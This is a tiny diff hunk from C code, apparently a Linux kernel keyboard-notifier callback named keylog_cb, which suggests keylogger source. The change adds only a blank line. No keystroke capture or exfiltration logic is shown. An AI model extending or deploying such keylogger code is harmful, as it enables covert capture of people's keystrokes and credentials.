@@ -91,6 +91,7 @@ static int keylog_cb(struct notifier_block *nb, unsigned long action, void *data
     unsigned long flags;
 
     if (action == 1 && param->down && param->value == KEY_Q) {
+        
         return NOTIFY_STOP;
     }
 
